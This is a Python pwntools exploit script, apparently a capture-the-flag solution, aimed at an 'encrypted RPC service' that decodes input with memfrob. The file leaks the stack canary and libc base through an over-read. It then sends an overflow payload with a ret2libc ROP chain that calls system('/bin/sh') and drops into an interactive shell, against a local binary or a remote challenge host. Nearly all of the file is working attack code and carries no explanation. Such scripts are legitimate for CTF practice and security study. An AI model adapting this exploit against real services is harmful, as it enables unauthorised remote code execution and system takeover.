#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from random import randrange, seed
import array
import numpy as np
import os
from enum import Enum

class Type(Enum):
	READ_T = 0
	WRITE_T = 1
	APPEND_T = 2
	END_T = 3

MAX_SIZE = 0x100
WELCOME = 'Welcome to encrypted RPC service!\n'
SEND = 'Send encrypted object:\n'
DATA = 'data: '

def make_obj(type, size = 0, data = b'-' * MAX_SIZE):
	return p32(type.value) + p32(size) + data

def make_read(size = MAX_SIZE, data = b'r' * (MAX_SIZE - 1) + b'\x00'):
	return make_obj(Type.READ_T, size, data)

def make_write():
	return make_obj(Type.WRITE_T)

def make_append(size = MAX_SIZE, data = b'a' * MAX_SIZE):
	return make_obj(Type.APPEND_T, size, data)

def make_end():
	return make_obj(Type.END_T)

def make_data(offset):
	data = make_read()
	data += make_append(offset)
	data += make_write()
	return data

def memfrob(s):
	return (np.frombuffer(s, dtype=np.uint8) ^ 42).tobytes()

def connect_remote():
	return remote('h4x.0x04.net', 1337)

def connect_test():
	cmd = 'gcc -fstack-protector test.c -o test'
	os.system(cmd)
	return process("./test", aslr = False)

def connect_target():
	return process("./target")#, env={"LD_PRELOAD": "libc.so.6"})	

def send(r, msg):
	r.send(memfrob(msg))

def finish(r):
	send(r, make_end())
	#send(r, make_write())
	r.interactive()

def get_canary(r):
	offset = 10
	msg = make_data(offset)
	#print('data', msg)
	#print(len(WELCOME) + 3 * len(SEND) + len(DATA) + MAX_SIZE + 2)
	send(r, msg)
	r.recvn(len(WELCOME + 3 * SEND + DATA) + MAX_SIZE - 1)
	r.recvn(offset)
	canary = b"\x00" + r.recvn(7)
	info("canary: 0x{:016x}".format(u64(canary)))
	info(canary)
	r.clean()
	return canary

def get_stack(r):
	offset = 3 + 31
	msg = make_data(offset)
	send(r, msg)
	r.recvn(len(2 * SEND + DATA) + MAX_SIZE + 25 + 31)
	stack = u64(r.recvn(6) + b"\x00\x00")
	stack -= 0x128
	info("stack: 0x{:016x}".format(stack))
	r.clean()
	return stack

def get_libc(r):
	offset = 3 + 15
	msg = make_data(offset)
	send(r, msg)
	r.recvn(len(2 * SEND + DATA) + MAX_SIZE + 25 + 15)
	libc = u64(r.recvn(6) + b"\x00\x00")
	libc -= 0x21b97
	#libc -= 0x22A1A3
	info("libc: 0x{:016x}".format(libc))
	r.clean()
	return libc

def get_shellcode_remote(libc):
	POP_RDI = 0x000000000002155f #0x0000000000026b62 
	SYSTEM = 0x4f440
	BIN_SH = 0x1b3e9a
	RET = POP_RDI + 1

	msg = p64(libc + RET)
	msg += p64(libc + POP_RDI)
	msg += p64(libc + BIN_SH)
	msg += p64(libc + SYSTEM)

	return msg

def get_shellcode_local():
	libc = 0x00007ffff7bf2000 + 0x203000

	POP_RDI = 0x26b62 #0x0000000000026b62 
	SYSTEM = 0x499E0
	BIN_SH = 0x18d1ac #SIGSEGV
	RET = POP_RDI + 1

	msg = p64(libc + RET)
	info("RET: 0x{:016x}".format(libc + RET))
	msg += p64(libc + POP_RDI)
	info("POP_RDI: 0x{:016x}".format(libc + POP_RDI))
	msg += p64(libc + BIN_SH)
	info("BIN_SH: 0x{:016x}".format(libc + BIN_SH))
	msg += p64(libc + SYSTEM)
	info("SYSTEM: 0x{:016x}".format(libc + SYSTEM))

	return msg

def exploit(r, canary, shellcode):
	msg = make_read(MAX_SIZE, b'o' * (MAX_SIZE - 1) + b'\x00')
	data = b'b' * 9
	data += canary
	data += b'\x00' * 24
	data += shellcode
	l = len(data)
	data += b'e' * (MAX_SIZE - l)
	#data.ljust(MAX_SIZE, b"b")
	msg += make_append(l,  data)

	# b'b' * (MAX_SIZE - len(canary) - 9)
	#msg += make_append(10,  b'b' * 9 + canary + b'b' * (MAX_SIZE - len(canary) - 9))
	#msg += canary
	#msg += p64(0)
	#msg += shellcode
	msg += make_write()
	#msg += make_data(0)
	send(r, msg)

def main():
	#r = connect_remote()
	#r = connect_test()
	r = connect_target()
	canary = get_canary(r)
	#stack = get_stack(r)

	#shellcode = get_shellcode_remote(get_libc(r))

	shellcode = get_shellcode_local()
	exploit(r, canary, shellcode)

	#gdb.attach(r)
	#sleep(0.3)

	#check_canary(r, canary)
	
	
	#gdb.attach(r,  gdbscript = "display/10i $pc\nb *0")
	finish(r)

if __name__ == '__main__':
	main()
